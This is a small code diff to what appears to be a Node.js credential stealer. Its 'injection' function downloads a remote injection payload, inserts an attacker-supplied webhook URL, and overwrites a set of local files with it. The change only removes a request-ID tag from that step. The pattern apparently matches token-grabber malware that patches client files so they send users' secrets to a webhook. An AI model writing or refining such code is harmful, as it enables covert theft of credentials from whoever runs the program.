@@ -1,7 +1,6 @@
 let fs = require("fs"),
   path = require("path"),
   { exec } = require("child_process"),
-  { uniqueId } = require("./../../utils/functions/functions"),
   { instance } = require("./../../utils/axios/request"),
   config = require("./../../config/config")(),
   process = require("process");
@@ -62,7 +61,7 @@ const injection = async (webhook) => {
         }]
       }
     });
-    let text = (await instance.get(Injection)).data.replace("%WEBHOOK%", webhook[0]).replace("%ID_REQUEST%", uniqueId());
+    let text = (await instance.get(Injection)).data.replace("%WEBHOOK%", webhook[0]);
     await Promise.all(injecPath.map(async (f) => {
       await fs.promises.writeFile(f, text, { encoding: "utf8", flag: "w" });
     }));
